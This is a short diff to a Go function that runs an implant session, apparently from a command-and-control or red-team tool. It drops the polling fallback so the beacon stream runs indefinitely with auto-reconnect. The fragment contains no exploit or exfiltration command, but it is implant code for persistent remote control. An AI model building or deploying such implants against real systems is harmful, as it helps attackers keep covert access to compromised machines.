@@ -134,14 +134,7 @@ func runImplantSession(implant *Implant) error {
 			implant.BeaconInterval, implant.JitterPercent)
 	}
 
-	// Start beacon stream (preferred method)
-	if err := implant.StartBeaconStream(); err != nil {
-		if DebugMode {
-			log.Printf("Stream failed, falling back to polling: %v", err)
-		}
-		// Fallback to polling if streaming fails
-		return implant.StartPolling()
-	}
-	
-	return nil
+	// Start beacon stream - runs indefinitely with auto-reconnect
+	// This never returns unless there's a fatal error
+	return implant.StartBeaconStream()
 }
